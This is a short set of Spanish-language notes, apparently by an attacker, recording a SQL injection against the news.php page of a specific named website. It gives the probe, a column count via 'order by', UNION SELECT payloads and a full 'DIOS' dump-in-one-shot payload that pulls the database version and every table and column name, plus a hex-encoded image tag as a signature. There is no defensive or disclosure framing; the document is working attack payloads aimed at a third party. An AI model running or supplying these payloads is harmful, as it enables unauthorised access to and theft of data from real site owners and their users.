# Vulnerabilidad:
http://math4all.in/news.php?id=6'

# Existen 6 tablas: 
http://math4all.in/news.php?id=6' order by 7-- -

# Opcion 1
http://math4all.in/news.php?id=6' AND 0 Union Select 1,2,3,4,5,6-- -

# Opcion 2
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,2,3,4,5,6--+-

### Se muestran 2 y 3 en pantalla, asÃ­ que puedo usar cualquiera de las 2. 

# Usando 2 para DIOS
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,>>>>DIOS<<<<,3,4,5,6--+-

## DIOS Fz3r0 - El chido: 
http://math4all.in/news.php?id=6'AND 0 UNION SELECT 1,concat/*!(,0x3c696d67207372633d2268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f467a3372302f467a3372305f2d5f426c61636b536861726b2f6d61696e2f4172742f44494f535f467a3372305f6d696e692e706e672220636c6173733d22696d672d726573706f6e73697665223e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/,3,4,5,6--+-

## El chido pegado (espacios con %20)

# Codificar HTML

se agrega el 0x al principio
